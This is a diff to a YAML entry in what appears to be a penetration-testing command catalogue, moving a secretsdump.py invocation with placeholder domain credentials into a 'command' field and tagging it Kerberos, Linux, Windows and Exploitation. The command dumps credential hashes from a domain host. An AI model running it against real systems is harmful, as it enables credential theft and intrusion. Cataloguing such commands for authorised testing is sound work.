@@ -12,21 +12,16 @@ description: |
 
   	Password: password123
 
+command: |
+  python3 secretsdump.py test.local/john:password123@10.10.10.1
 items:
-  Password:
-    - code: |
-        python3 secretsdump.py test.local/john:password123@10.10.10.1
-  Username:
-    - code: |
-        empty
-filters:
-  Kerberos:
-    - code: |
-        empty
-  Linux:
-    - code: |
-        empty
-  Windows:
-    - code: |
-        empty
+  - Password
+  - Username
+services:
+  - Kerberos
+OS:
+  - Linux
+  - Windows
+attack_types:
+  - Exploitation
 ---
